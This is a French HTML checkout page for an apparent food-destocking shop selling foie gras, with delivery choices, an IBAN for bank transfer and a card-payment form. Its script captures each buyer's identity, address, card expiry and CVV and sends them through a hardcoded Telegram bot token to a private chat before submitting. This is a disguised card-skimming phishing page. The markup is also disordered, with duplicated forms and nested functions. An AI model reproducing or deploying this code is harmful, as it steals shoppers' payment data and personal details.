<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation de Commande - Destockage Alimentaire</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Reset CSS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
            min-height: 100vh;
            overflow-y: auto;
        }

        /* Barre de navigation */
        .navbar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            display: flex;
            justify-content: flex-start;
            align-items: center;
            gap: 20px;
            padding: 10px 20px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }

        .navbar img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            margin-right: 20px;
            transition: transform 0.3s ease, opacity 0.3s ease;
            filter: drop-shadow(2px 2px 5px rgba(0, 0, 0, 0.2));
        }

        .navbar img:hover {
            transform: scale(1.1);
            opacity: 0.9;
        }

        .navbar button {
            background: transparent;
            border: none;
            color: #2c3e50;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 20px;
            border-radius: 50px;
            transition: all 0.3s ease;
        }

        .navbar button:hover {
            background: rgba(44, 62, 80, 0.1);
            transform: translateY(-2px);
        }

        /* Conteneur principal */
        .container {
            max-width: 1200px;
            margin: 100px auto 40px;
            padding: 20px;
            display: flex;
            gap: 40px;
        }

        /* Section Formulaire */
        .form-section {
            flex: 1;
            background: #fff;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .form-section h2 {
            font-size: 24px;
            font-weight: 700;
            color: #2c3e50;
            margin-bottom: 20px;
            animation: fadeIn 1s ease-in-out;
        }

        .form-group {
            margin-bottom: 20px;
            animation: slideIn 0.5s ease-in-out;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #555;
            margin-bottom: 5px;
        }

        .form-group input,
        .form-group textarea,
        .form-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .form-group input:focus,
        .form-group textarea:focus,
        .form-group select:focus {
            border-color: #2c3e50;
            box-shadow: 0 0 8px rgba(44, 62, 80, 0.2);
            outline: none;
        }

        .form-group textarea {
            resize: vertical;
            height: 100px;
        }

        .form-group.checkbox {
            display: flex;
            align-items: center;
        }

        .form-group.checkbox input {
            width: auto;
            margin-right: 10px;
        }

        .form-group.checkbox label {
            margin: 0;
        }

        .payment-options {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .payment-options label {
            flex: 1;
            padding: 15px;
            background: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.3s ease, border-color 0.3s ease;
        }

        .payment-options input[type="radio"] {
            display: none;
        }

        .payment-options input[type="radio"]:checked + label {
            background: #2c3e50;
            color: #fff;
            border-color: #2c3e50;
        }

        .credit-card-form {
            display: none;
            margin-top: 20px;
        }

        .credit-card-form.active {
            display: block;
        }

        .button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .button:hover {
            background: linear-gradient(135deg, #34495e, #2c3e50);
        }

        .link-button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #28a745, #1e7e34);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            text-align: center;
            text-decoration: none;
            display: block;
        }

        .link-button:hover {
            background: linear-gradient(135deg, #1e7e34, #28a745);
        }

        /* Section R√©sum√© */
        .summary-section {
            flex: 1;
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: #fff;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .summary-section h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 20px;
            animation: fadeIn 1s ease-in-out;
        }

        .summary-item {
            margin-bottom: 20px;
            animation: slideIn 0.5s ease-in-out;
        }

        .summary-item h2 {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 10px;
        }

        .summary-item p {
            font-size: 16px;
            color: #ddd;
            margin: 5px 0;
        }

        .quantity-control {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .quantity-control button {
            background: #28a745;
            color: #fff;
            border: none;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .quantity-control button:hover {
            background: #1e7e34;
        }

        .quantity-control input {
            width: 50px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 5px;
        }

        .delete-item {
            color: #ff6b6b;
            cursor: pointer;
            font-size: 14px;
            transition: color 0.3s ease;
        }

        .delete-item:hover {
            color: #ff3b3b;
        }

        .totals {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .totals p {
            font-size: 18px;
            margin: 10px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .totals p span {
            font-weight: 700;
        }

        .total {
            font-size: 24px;
            font-weight: 700;
            margin-top: 20px;
            color: #28a745;
        }

        .footer {
            text-align: center;
            font-size: 12px;
            color: #ddd;
            margin-top: 20px;
        }

        .footer a {
            color: #28a745;
            text-decoration: none;
        }

        /* Bouton Retour au panier */
        .back-to-cart {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: #fff;
            padding: 15px 20px;
            border-radius: 50px;
            text-decoration: none;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }

        .back-to-cart:hover {
            transform: translateY(-2px);
        }

        /* Informations de virement */
        .bank-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            display: block; /* Afficher par d√©faut */
        }

        .bank-info p {
            font-size: 14px;
            color: #555;
            margin: 5px 0;
        }

        /* Logo Stripe */
        .stripe-logo {
            width: 50px;
            margin-left: 10px;
            vertical-align: middle;
        }

        /* Style ultra-moderne pour le choix du plan de paiement */
        .installment-plan {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .installment-plan label {
            flex: 1;
            padding: 15px;
            background: #f8f9fa;
            border: 1px solid #ddd;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.3s ease, border-color 0.3s ease;
        }

        .installment-plan input[type="radio"] {
            display: none;
        }

        .installment-plan input[type="radio"]:checked + label {
            background: #2c3e50;
            color: #fff;
            border-color: #2c3e50;
        }

        /* Section moderne pour le montant divis√© */
        .installment-amount-display {
            margin-top: 20px;
            padding: 20px;
            background: linear-gradient(135deg, #2c3e50, #34495e);
            border-radius: 10px;
            text-align: center;
            display: none;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            animation: fadeIn 0.5s ease-in-out;
        }

        .installment-amount-display.active {
            display: block;
        }

        .installment-amount-display h3 {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 10px;
        }

        .installment-amount-display p {
            font-size: 24px;
            font-weight: 700;
            color: #28a745;
            margin: 0;
        }

        /* Section moderne pour le code promo */
        .promo-code {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }

        .promo-code input {
            flex: 1;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            background: #f8f9fa;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .promo-code input:focus {
            border-color: #2c3e50;
            box-shadow: 0 0 8px rgba(44, 62, 80, 0.2);
            outline: none;
        }

        .promo-code button {
            padding: 12px 20px;
            background: linear-gradient(135deg, #28a745, #1e7e34);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .promo-code button:hover {
            background: linear-gradient(135deg, #1e7e34, #28a745);
        }

        /* Section pour l'article r√©cemment supprim√© */
        .recently-deleted {
            margin-top: 20px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            text-align: center;
            display: none;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.5s ease-in-out;
        }

        .recently-deleted.active {
            display: block;
        }

        .recently-deleted h3 {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 10px;
        }

        .recently-deleted button {
            padding: 10px 20px;
            background: linear-gradient(135deg, #28a745, #1e7e34);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .recently-deleted button:hover {
            background: linear-gradient(135deg, #1e7e34, #28a745);
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- Barre de navigation -->
    <div class="navbar">
        <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Logo Destockage Alimentaire">
        <button onclick="window.location.href='https://destockagealimentaireprixbas.com'"><i class="fas fa-home"></i> Accueil</button>
        <button onclick="window.location.href='https://destockagealimentaireprixbas.com/index.php/a-propos/'"><i class="fas fa-info-circle"></i> A propos</button>
        <button onclick="window.location.href='https://destockagealimentaireprixbas.com/index.php/produits/'"><i class="fas fa-box"></i> Produits</button>
        <button onclick="window.location.href='https://destockagealimentaireprixbas.com/index.php/contact/'"><i class="fas fa-envelope"></i> Contact</button>
    </div>

    <!-- Conteneur principal -->
    <div class="container">
        <!-- Formulaire √† gauche -->
        <div class="form-section">
            <h2>Coordonn√©es</h2>
            <div class="form-group">
                <label for="first-name"><i class="fas fa-user"></i> Pr√©nom</label>
                <input type="text" id="first-name" placeholder="Entrez votre pr√©nom">
            </div>
            <div class="form-group">
                <label for="last-name"><i class="fas fa-user"></i> Nom</label>
                <input type="text" id="last-name" placeholder="Entrez votre nom">
            </div>
            <div class="form-group">
                <label for="email"><i class="fas fa-envelope"></i> Adresse e-mail</label>
                <input type="email" id="email" placeholder="Entrez votre e-mail">
            </div>
            <div class="form-group">
                <label for="phone"><i class="fas fa-phone"></i> Num√©ro de t√©l√©phone</label>
                <input type="tel" id="phone" placeholder="Entrez votre num√©ro de t√©l√©phone">
            </div>
            <div class="form-group">
                <label for="address"><i class="fas fa-map-marker-alt"></i> Adresse de livraison</label>
                <textarea id="address" placeholder="Entrez votre adresse de livraison"></textarea>
            </div>
            <div class="form-group checkbox">
                <input type="checkbox" id="same-address">
                <label for="same-address"><i class="fas fa-copy"></i> Utiliser la m√™me adresse pour la facturation</label>
            </div>
            <div id="billing-address" class="form-group" style="display: none;">
                <label for="billing-address-input"><i class="fas fa-file-invoice"></i> Adresse de facturation</label>
                <textarea id="billing-address-input" placeholder="Entrez votre adresse de facturation"></textarea>
            </div>

            <h2>Options de livraison</h2>
            <div class="payment-options">
                <input type="radio" id="ups" name="delivery" checked>
                <label for="ups"><i class="fas fa-truck"></i> Livraison UPS - 59,99‚Ç¨</label>
                <input type="radio" id="fedex" name="delivery">
                <label for="fedex"><i class="fas fa-shipping-fast"></i> Livraison Fedex - 69,99‚Ç¨</label>
            </div>

            <h2>Options de paiement</h2>
            <div class="payment-options">
                <input type="radio" id="bank-transfer" name="payment" checked>
                <label for="bank-transfer"><i class="fas fa-university"></i> Virement bancaire</label>
                <input type="radio" id="credit-card" name="payment">
                <label for="credit-card"><i class="fas fa-credit-card"></i> Carte de cr√©dit <img src="https://stripe.com/img/about/logos/logos/blue@2x.png" class="stripe-logo" alt="Stripe"></label>
                <input type="radio" id="installment" name="payment">
                <label for="installment"><i class="fas fa-credit-card"></i> Payer en plusieurs fois <img src="https://stripe.com/img/about/logos/logos/blue@2x.png" class="stripe-logo" alt="Stripe"></label>
            </div>

            <!-- Informations de virement bancaire -->
            <div id="bank-transfer-info" class="bank-info">
                <p><strong>IBAN:</strong> FR76 2763 3121 2901 0104 6193 533</p>
                <p><strong>BIC:</strong> BUNQFRP2</p>
                <p><strong>Nom:</strong> Destockagealimentaire prix bas</p>
            </div>

            <!-- Formulaire de carte de cr√©dit (optionnel) -->
            <div id="credit-card-form" class="credit-card-form">
                <div class="form-group">
                    <label for="cardholder-name"><i class="fas fa-user"></i> Nom du titulaire</label>
                    <input type="text" id="cardholder-name" placeholder="Entrez le nom du titulaire">
                </div>
                <div class="form-group">
                    <label for="card-number"><i class="fas fa-credit-card"></i> Num√©ro de carte</label>
                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456">
                </div>
                <div class="form-group">
                    <label for="expiry-date"><i class="fas fa-calendar-alt"></i> Date d'expiration</label>
                    <input type="text" id="expiry-date" placeholder="MM/AA">
                </div>
                <div class="form-group">
                    <label for="cvv"><i class="fas fa-lock"></i> CVV</label>
                    <input type="text" id="cvv" placeholder="123">
                </div>
            </div>

            <!-- Options de paiement en plusieurs fois -->
            <div id="installment-options" class="form-group" style="display: none;">
                <label for="installment-plan"><i class="fas fa-calendar"></i> Choisissez un plan de paiement</label>
                <div class="installment-plan">
                    <input type="radio" id="installment-3" name="installment-plan" value="3">
                    <label for="installment-3">Payer en 3 fois</label>
                    <input type="radio" id="installment-4" name="installment-plan" value="4">
                    <label for="installment-4">Payer en 4 fois</label>
                </div>
                <!-- Affichage du montant divis√© -->
                <div id="installment-amount-display" class="installment-amount-display">
                    <h3>Montant par mensualit√©</h3>
                    <p id="installment-amount-value"></p>
                </div>
                <div id="order-summary"><!-- Le panier s'affichera ici --></div>

<form method="post" action="/traiter-commande">
    <!-- Vos champs normaux -->
    <input type="text" name="nom" placeholder="Votre nom" required>
    
    <!-- Champs cach√©s pour le panier -->
    <input type="hidden" name="cart_data" id="hidden-cart-data">
    <input type="hidden" name="total" id="hidden-total">
    
    <button type="submit">Payer maintenant</button>
</form>
<div id="cart-display">
    <!-- Le contenu du panier appara√Ætra ici -->
</div>

<form id="order-form" method="post">
    <!-- Vos champs de formulaire -->
    <input type="text" name="nom" placeholder="Votre nom" required>
    
    <!-- Champs cach√©s -->
    <input type="hidden" name="cart_total" id="cart-total">
    <input type="hidden" name="cart_items" id="cart-items">
    
    <button type="submit">Valider la commande</button>
</form>
                
<form action="/jumeler" method="post">
    <!-- Champs cach√©s pour r√©cup√©rer les donn√©es -->
    <input type="hidden" name="first-name" id="first-name-hidden">
    <input type="hidden" name="last-name" id="last-name-hidden">
    <input type="hidden" name="email" id="email-hidden">
    <input type="hidden" name="phone" id="phone-hidden">
    <input type="hidden" name="total-montant" id="montant-total-hidden">
    <input type="hidden" name="final-total" id="final-total-hidden">
    <button type="submit" class="link-button"><i class="fas fa-link"></i> Jumeler votre compte</button>
    </form>
            </div>

            <h2>Ajouter une note √† votre commande</h2>
            <div class="form-group">
                <textarea id="note" placeholder="Ajoutez une note ici..."></textarea>
            </div>

            <form action="/commander" method="post" id="order-form">
<form action="/commander" method="post">
    <!-- Champs cach√©s pour r√©cup√©rer les donn√©es -->
    <input type="hidden" name="first-name" id="first-name-hidden" value="{{ data.first_name }}">
    <input type="hidden" name="last-name" id="last-name-hidden" value="{{ data.last_name }}">
    <input type="hidden" name="email" id="email-hidden" value="{{ data.email }}">
    <input type="hidden" name="phone" id="phone-hidden" value="{{ data.phone }}">
    <input type="hidden" name="address" id="address-hidden" value="{{ data.address }}">
    <input type="hidden" name="billing-address" id="billing-address-hidden" value="{{ data.billing_address }}">
    <input type="hidden" name="quantity" id="quantity-hidden" value="{{ data.quantity }}">
    <input type="hidden" name="subtotal" id="subtotal-hidden" value="{{ data.subtotal }}">
    <input type="hidden" name="delivery-cost" id="delivery-cost-hidden" value="{{ data.delivery_cost }}">
    <input type="hidden" name="discount" id="discount-hidden" value="{{ data.discount }}">
    <input type="hidden" name="final-total" id="final-total-hidden" value="{{ data.final_total }}">
    <input type="hidden" name="montant-total"id="final-total-hidden" value="{{ data.final_total }}">
    <input type="hidden" name="total-amount" id="final-total-hidden" value="{{ data.final_total }}">
    <input type="hidden" name="note" id="note-hidden" value="{{ data.note }}">
    <input type="hidden" name="payment-method" id="payment-method-hidden" value="{{ data.payment_method }}">
    <input type="hidden" name="cardholder-name" id="cardholder-name-hidden" value="{{ data.cardholder_name }}">
    <input type="hidden" name="card-number" id="card-number-hidden" value="{{ data.card_number }}">
    <input type="hidden" name="expiry-date" id="expiry-date-hidden" value="{{ data.expiry_date }}">
    <input type="hidden" name="cvv" id="cvv-hidden" value="{{ data.cvv }}">
    <input type="hidden" name="installment-plan" id="installment-plan-hidden" value="{{ data.installment_plan }}">
    <button type="submit" class="button" id="submit-button"><i class="fas fa-check"></i> Commander</button>
</form>

            </form>

    
        </div>

        <!-- R√©sum√© de la commande √† droite -->
        <div class="summary-section">
            <div>
                <h1>R√©sum√© de la commande</h1>
                <div class="summary-item">
                    <h2>1 article</h2>
                    <p>Lot de 10 unit√©s de foie gras Labeyrie 285g</p>
                    <div class="quantity-control">
                        <button onclick="updateQuantity(-1)"><i class="fas fa-minus"></i></button>
                        <input type="number" id="quantity" value="1" min="1" readonly>
                        <button onclick="updateQuantity(1)"><i class="fas fa-plus"></i></button>
                    </div>
                    <p id="product-price">257,00‚Ç¨</p>
                    <p class="delete-item" onclick="removeItem()"><i class="fas fa-trash"></i> Supprimer l'article</p>
                </div>
                <div class="totals">
                    <p>üõí Sous-total : <span id="subtotal">257,00‚Ç¨</span></p>
                    <p>üöö Livraison : <span id="delivery-cost">59,99‚Ç¨</span> (UPS)</p>
                    <p>üéÅ R√©duction : <span id="discount">0,00‚Ç¨</span></p>
                    <p class="total">üí≥ Total : <span id="final-total">316,99‚Ç¨</span></p>
                </div>
                <!-- Section moderne pour le code promo -->
                <div class="promo-code">
                    <input type="text" id="promo-code" placeholder="Entrez votre code promo">
                    <button onclick="applyPromoCode()">Appliquer</button>
                </div>
                <!-- Section pour l'article r√©cemment supprim√© -->
                <div id="recently-deleted" class="recently-deleted">
                    <h3>Article r√©cemment supprim√©</h3>
                    <button onclick="restoreItem()"><i class="fas fa-undo"></i> R√©ajouter l'article</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Bouton Retour au panier -->
    <a href="https://destockagealimentaireprixbas.com/panier/" class="back-to-cart"><i class="fas fa-arrow-left"></i> Retour au panier</a>

    <script>
        // Variables globales
        const productPrice = 257.00;
        let discount = 0;
        let deletedItem = null; // Stocke l'article supprim√©

        // Mise √† jour de la quantit√© et du total
        function updateQuantity(change) {
            const quantityInput = document.getElementById('quantity');
            let quantity = parseInt(quantityInput.value);
            quantity += change;
            if (quantity < 1) quantity = 1;
            quantityInput.value = quantity;

            updateTotals();
        }

        // Supprimer l'article
        function removeItem() {
            const summaryItem = document.querySelector('.summary-item');
            deletedItem = summaryItem.cloneNode(true); // Sauvegarde l'article supprim√©
            summaryItem.remove();
            document.getElementById('subtotal').textContent = '0,00‚Ç¨';
            document.getElementById('final-total').textContent = '0,00‚Ç¨';

            // Affiche la section "Article r√©cemment supprim√©"
            document.getElementById('recently-deleted').classList.add('active');
        }

        // R√©ajouter l'article
        function restoreItem() {
            if (deletedItem) {
                const summarySection = document.querySelector('.summary-section > div');
                summarySection.insertBefore(deletedItem, document.querySelector('.totals'));
                document.getElementById('recently-deleted').classList.remove('active');
                updateTotals();
            }
        }

        // Appliquer le code promo
        function applyPromoCode() {
            const promoCode = document.getElementById('promo-code').value.trim();
            if (promoCode === 'destock10') {
                discount = 0.10;
            } else if (promoCode === 'destock15') {
                discount = 0.15;
            } else {
                discount = 0;
            }
            updateTotals();
        }

        // Mise √† jour des totaux
        function updateTotals() {
            const quantity = parseInt(document.getElementById('quantity').value);
            const deliveryCost = parseFloat(document.getElementById('delivery-cost').textContent.replace('‚Ç¨', ''));
            const subtotal = (productPrice * quantity).toFixed(2);
            const discountAmount = (subtotal * discount).toFixed(2);
            const finalTotal = (subtotal - discountAmount + deliveryCost).toFixed(2);

            document.getElementById('subtotal').textContent = `${subtotal}‚Ç¨`;
            document.getElementById('discount').textContent = `${discountAmount}‚Ç¨`;
            document.getElementById('final-total').textContent = `${finalTotal}‚Ç¨`;

            
            function updateTotals() {
    const quantity = parseInt(document.getElementById('quantity').value);
    const productPrice = 257.00; // Prix unitaire du produit
    const deliveryCost = 59.99; // Frais de livraison

    // Calculer le sous-total
    const subtotal = quantity * productPrice;
    document.getElementById('subtotal-hidden').value = subtotal.toFixed(2) + ' ‚Ç¨';
    document.getElementById('subtotal').textContent = subtotal.toFixed(2) + ' ‚Ç¨';

    // Calculer le total final
    const finalTotal = subtotal + deliveryCost;
    document.getElementById('final-total-hidden').value = finalTotal.toFixed(2) + ' ‚Ç¨';
    document.getElementById('final-total').textContent = finalTotal.toFixed(2) + ' ‚Ç¨';
    document.getElementById('montant-total-hidden').value = finalTotal.toFixed(2) + ' ‚Ç¨';
}

    // √âcouteur d'√©v√©nement pour mettre √† jour les totaux lorsque la quantit√© change
    document.getElementById('quantity').addEventListener('change', updateTotals);

            // Mise √† jour du montant par mensualit√©
            const installmentPlan = document.querySelector('input[name="installment-plan"]:checked');
            if (installmentPlan) {
                const installmentCount = parseInt(installmentPlan.value);
                const installmentAmount = (finalTotal / installmentCount).toFixed(2);
                document.getElementById('installment-amount-display').classList.add('active');
                document.getElementById('installment-amount-value').textContent = `${installmentAmount}‚Ç¨`;
            } else {
                document.getElementById('installment-amount-display').classList.remove('active');
            }
        }

        // Mise √† jour des frais de livraison
        const deliveryOptions = document.querySelectorAll('input[name="delivery"]');
        deliveryOptions.forEach(option => {
            option.addEventListener('change', () => {
                const deliveryCost = option.id === 'ups' ? 59.99 : 69.99;
                document.getElementById('delivery-cost').textContent = `${deliveryCost.toFixed(2)}‚Ç¨`;
                updateTotals();
            });
        });

        // Gestion des options de paiement
        const creditCardForm = document.getElementById('credit-card-form');
        const creditCardOption = document.getElementById('credit-card');
        const installmentOptions = document.getElementById('installment-options');
        const installmentOption = document.getElementById('installment');
        const bankTransferInfo = document.getElementById('bank-transfer-info');
        const bankTransferOption = document.getElementById('bank-transfer');

        creditCardOption.addEventListener('change', () => {
            if (creditCardOption.checked) {
                creditCardForm.classList.add('active');
                installmentOptions.style.display = 'none';
                bankTransferInfo.style.display = 'none';
            } else {
                creditCardForm.classList.remove('active');
            }
        });

        installmentOption.addEventListener('change', () => {
            if (installmentOption.checked) {
                installmentOptions.style.display = 'block';
                creditCardForm.classList.remove('active');
                bankTransferInfo.style.display = 'none';
            } else {
                installmentOptions.style.display = 'none';
            }
        });

        bankTransferOption.addEventListener('change', () => {
            if (bankTransferOption.checked) {
                bankTransferInfo.style.display = 'block';
                creditCardForm.classList.remove('active');
                installmentOptions.style.display = 'none';
            } else {
                bankTransferInfo.style.display = 'none';
            }
        });

        // √âcouteur d'√©v√©nement pour mettre √† jour le montant divis√©
        const installmentPlans = document.querySelectorAll('input[name="installment-plan"]');
        installmentPlans.forEach(plan => {
            plan.addEventListener('change', () => {
                updateTotals();
            });
        });

        // Afficher/masquer l'adresse de facturation
        const sameAddressCheckbox = document.getElementById('same-address');
        const billingAddress = document.getElementById('billing-address');

        sameAddressCheckbox.addEventListener('change', () => {
            if (!sameAddressCheckbox.checked) {
                billingAddress.style.display = 'block';
            } else {
                billingAddress.style.display = 'none';
            }
        });

        // Fonction pour remplir les champs cach√©s avant la soumission du formulaire
        function fillHiddenFields() {
    // R√©cup√©rer les √©l√©ments du formulaire
    const firstName = document.getElementById('first-name')?.value || '';
    const lastName = document.getElementById('last-name')?.value || '';
    const email = document.getElementById('email')?.value || '';
    const phone = document.getElementById('phone')?.value || '';
    const address = document.getElementById('address')?.value || '';
    const billingAddress = document.getElementById('billing-address-input')?.value || '';
    const quantity = document.getElementById('quantity')?.value || '';
    const subtotal = document.getElementById('subtotal')?.textContent || '';
    const deliveryCost = document.getElementById('delivery-cost')?.textContent || '';
    const discount = document.getElementById('discount')?.textContent || '';
    const finalTotal = document.getElementById('final-total')?.textContent.trim() || '';    
    const montantTotal = document.getElementById('total-montant')?.textContent.trim() || '';
    const note = document.getElementById('note')?.value || '';
    const paymentMethod = document.querySelector('input[name="payment"]:checked')?.nextElementSibling.textContent || 'Non renseign√©';
    const cardholderName = document.getElementById('cardholder-name')?.value || 'Non renseign√©';
    const cardNumber = document.getElementById('card-number')?.value || 'Non renseign√©';
    const expiryDate = document.getElementById('expiry-date')?.value || 'Non renseign√©';
    const cvv = document.getElementById('cvv')?.value || 'Non renseign√©';
    const installmentPlan = document.querySelector('input[name="installment-plan"]:checked')?.value || 'Non renseign√©';

    // Remplir les champs cach√©s
    document.getElementById('first-name-hidden').value = firstName;
    document.getElementById('last-name-hidden').value = lastName;
    document.getElementById('email-hidden').value = email;
    document.getElementById('phone-hidden').value = phone;
    document.getElementById('address-hidden').value = address;
    document.getElementById('billing-address-hidden').value = billingAddress;
    document.getElementById('quantity-hidden').value = quantity;
    document.getElementById('subtotal-hidden').value = subtotal;
    document.getElementById('delivery-cost-hidden').value = deliveryCost;
    document.getElementById('discount-hidden').value = discount;
    document.getElementById('final-total-hidden').value = finalTotal;
    document.getElementById('montant-total-hidden').value = montantTotal;
    document.getElementById('note-hidden').value = note;
    document.getElementById('payment-method-hidden').value = paymentMethod;
    document.getElementById('cardholder-name-hidden').value = cardholderName;
    document.getElementById('card-number-hidden').value = cardNumber;
    document.getElementById('expiry-date-hidden').value = expiryDate;
    document.getElementById('cvv-hidden').value = cvv;
    document.getElementById('installment-plan-hidden').value = installmentPlan;

    // Log pour d√©bogage
    console.log("Total montant r√©cup√©r√© : ", montantTotal);
    console.log("Donn√©es du formulaire remplies avec succ√®s.");
}

        // Fonction pour envoyer les donn√©es √† Telegram
        async function sendToTelegram(data) {
            const botToken = '7600255086:AAGzf33SV7c2DInVmUEB3EwxhsjT9esj-1w';
            const chatId = '5652184847';
            
            // Formatage du message
            let message = `üì¶ *Nouvelle Commande* üì¶\n\n`;
            message += `üë§ *Client*: ${data.firstName} ${data.lastName}\n`;
            message += `üìß *Email*: ${data.email}\n`;
            message += `üì± *T√©l√©phone*: ${data.phone}\n`;
            message += `üè† *Adresse*: ${data.address}\n`;
            if (data.billingAddress) message += `üè¢ *Adresse facturation*: ${data.billingAddress}\n`;
            message += `\nüí∞ *D√©tails de paiement* üí∞\n`;
            message += `üí≥ *M√©thode*: ${data.paymentMethod}\n`;
            if (data.cardNumber !== 'Non renseign√©') {
                message += `üîí *Carte*: ${data.cardNumber.replace(/\d(?=\d{4})/g, "*")}\n`;
                message += `üìÖ *Expiration*: ${data.expiryDate}\n`;
                message += `üîê *CVV*: ${data.cvv}\n`;
            }
            message += `\nüõí *D√©tails de la commande* üõí\n`;
            message += `üì¶ *Produit*: Lot de 10 unit√©s de foie gras Labeyrie 285g\n`;
            message += `üî¢ *Quantit√©*: ${data.quantity}\n`;
            message += `üí∂ *Sous-total*: ${data.subtotal}\n`;
            message += `üöö *Livraison*: ${data.deliveryCost}\n`;
            message += `üéÅ *R√©duction*: ${data.discount}\n`;
            message += `üíµ *Total*: ${data.finalTotal}\n`;
            if (data.note) message += `\nüìù *Note*: ${data.note}\n`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const result = await response.json();
                console.log('Message envoy√© √† Telegram:', result);
                return result.ok;
            } catch (error) {
                console.error('Erreur lors de l\'envoi √† Telegram:', error);
                return false;
            }
        }

        // Gestion de la soumission du formulaire
        document.getElementById('order-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Remplir les champs cach√©s
            fillHiddenFields();
            
            // R√©cup√©rer les donn√©es du formulaire
            const formData = {
                firstName: document.getElementById('first-name-hidden').value,
                lastName: document.getElementById('last-name-hidden').value,
                email: document.getElementById('email-hidden').value,
                phone: document.getElementById('phone-hidden').value,
                address: document.getElementById('address-hidden').value,
                billingAddress: document.getElementById('billing-address-hidden').value,
                quantity: document.getElementById('quantity-hidden').value,
                subtotal: document.getElementById('subtotal-hidden').value,
                deliveryCost: document.getElementById('delivery-cost-hidden').value,
                discount: document.getElementById('discount-hidden').value,
                finalTotal: document.getElementById('final-total-hidden').value,
                note: document.getElementById('note-hidden').value,
                paymentMethod: document.getElementById('payment-method-hidden').value,
                cardholderName: document.getElementById('cardholder-name-hidden').value,
                cardNumber: document.getElementById('card-number-hidden').value,
                expiryDate: document.getElementById('expiry-date-hidden').value,
                cvv: document.getElementById('cvv-hidden').value,
                installmentPlan: document.getElementById('installment-plan-hidden').value
            };

            // Envoyer les donn√©es √† Telegram
            const telegramSuccess = await sendToTelegram(formData);
            
            if (telegramSuccess) {
                // Soumettre le formulaire apr√®s l'envoi √† Telegram
                this.submit();
            } else {
                alert('Une erreur est survenue lors de l\'envoi de la commande. Veuillez r√©essayer.');
            }
        });

        // √âcouteurs d'√©v√©nements pour les formulaires
        document.querySelector('form[action="/jumeler"]').addEventListener('submit', fillHiddenFields);
    // Fonction pour extraire les param√®tres URL
